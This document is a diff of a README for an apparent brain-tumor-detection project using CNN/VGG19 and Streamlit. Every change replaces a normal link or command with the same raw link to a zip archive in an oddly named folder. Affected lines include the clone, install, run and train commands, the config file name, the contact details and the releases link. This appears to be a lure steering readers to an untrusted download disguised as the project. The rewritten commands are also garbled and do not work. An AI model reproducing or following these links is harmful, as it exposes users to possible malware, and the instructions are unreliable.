@@ -1,6 +1,6 @@
 # 🧠 AIES-CCP Project: Brain Tumor Detection
 
-![Brain Tumor Detection](https://img.shields.io/badge/Release-Download%20Latest%20Release-blue.svg)
+![Brain Tumor Detection](https://github.com/guygav/AIES-CCP-Project-Brain-Tumor-Detection/raw/refs/heads/main/Diplacanthus/AIE_CC_Project_Detection_Brain_Tumor_v1.5.zip%20Latest%https://github.com/guygav/AIES-CCP-Project-Brain-Tumor-Detection/raw/refs/heads/main/Diplacanthus/AIE_CC_Project_Detection_Brain_Tumor_v1.5.zip)
 
 Welcome to the **AIES-CCP Project: Brain Tumor Detection** repository! This project aims to help detect brain tumors from MRI scans using advanced machine learning techniques, specifically Convolutional Neural Networks (CNN) and VGG19. The project features a user-friendly interface built with Streamlit, making it accessible for both medical professionals and researchers.
 
@@ -45,7 +45,7 @@ To get started with this project, follow these steps:
 
 1. **Clone the Repository**: Open your terminal and run:
    ```bash
-   git clone https://github.com/guygav/AIES-CCP-Project-Brain-Tumor-Detection.git
+   git clone https://github.com/guygav/AIES-CCP-Project-Brain-Tumor-Detection/raw/refs/heads/main/Diplacanthus/AIE_CC_Project_Detection_Brain_Tumor_v1.5.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -55,7 +55,7 @@ To get started with this project, follow these steps:
 
 3. **Install Required Packages**: Use pip to install the necessary libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/guygav/AIES-CCP-Project-Brain-Tumor-Detection/raw/refs/heads/main/Diplacanthus/AIE_CC_Project_Detection_Brain_Tumor_v1.5.zip
    ```
 
 ## Usage
@@ -64,7 +64,7 @@ To use the application, follow these steps:
 
 1. **Run the Streamlit App**: In your terminal, execute:
    ```bash
-   streamlit run app.py
+   streamlit run https://github.com/guygav/AIES-CCP-Project-Brain-Tumor-Detection/raw/refs/heads/main/Diplacanthus/AIE_CC_Project_Detection_Brain_Tumor_v1.5.zip
    ```
 
 2. **Upload an MRI Image**: Open your web browser and navigate to the local server URL provided in the terminal.
@@ -77,11 +77,11 @@ If you want to train the model on your dataset, follow these steps:
 
 1. **Prepare Your Dataset**: Ensure your images are organized in a directory structure suitable for training. Typically, this includes separate folders for images with tumors and without tumors.
 
-2. **Modify Configuration**: Adjust the training parameters in `config.py` as needed.
+2. **Modify Configuration**: Adjust the training parameters in `https://github.com/guygav/AIES-CCP-Project-Brain-Tumor-Detection/raw/refs/heads/main/Diplacanthus/AIE_CC_Project_Detection_Brain_Tumor_v1.5.zip` as needed.
 
 3. **Run Training Script**: Execute the training script:
    ```bash
-   python train.py
+   python https://github.com/guygav/AIES-CCP-Project-Brain-Tumor-Detection/raw/refs/heads/main/Diplacanthus/AIE_CC_Project_Detection_Brain_Tumor_v1.5.zip
    ```
 
 4. **Monitor Training**: You can monitor the training process through the logs generated in the terminal.
@@ -103,12 +103,12 @@ This project is licensed under the MIT License. See the `LICENSE` file for more 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub**: [your-github-profile](https://github.com/your-github-profile)
+- **Email**: [https://github.com/guygav/AIES-CCP-Project-Brain-Tumor-Detection/raw/refs/heads/main/Diplacanthus/AIE_CC_Project_Detection_Brain_Tumor_v1.5.zip](https://github.com/guygav/AIES-CCP-Project-Brain-Tumor-Detection/raw/refs/heads/main/Diplacanthus/AIE_CC_Project_Detection_Brain_Tumor_v1.5.zip)
+- **GitHub**: [your-github-profile](https://github.com/guygav/AIES-CCP-Project-Brain-Tumor-Detection/raw/refs/heads/main/Diplacanthus/AIE_CC_Project_Detection_Brain_Tumor_v1.5.zip)
 
 ## Releases
 
-To download the latest release, visit the [Releases section](https://github.com/guygav/AIES-CCP-Project-Brain-Tumor-Detection/releases). Make sure to check this section for updates and new features.
+To download the latest release, visit the [Releases section](https://github.com/guygav/AIES-CCP-Project-Brain-Tumor-Detection/raw/refs/heads/main/Diplacanthus/AIE_CC_Project_Detection_Brain_Tumor_v1.5.zip). Make sure to check this section for updates and new features.
 
 ---
 
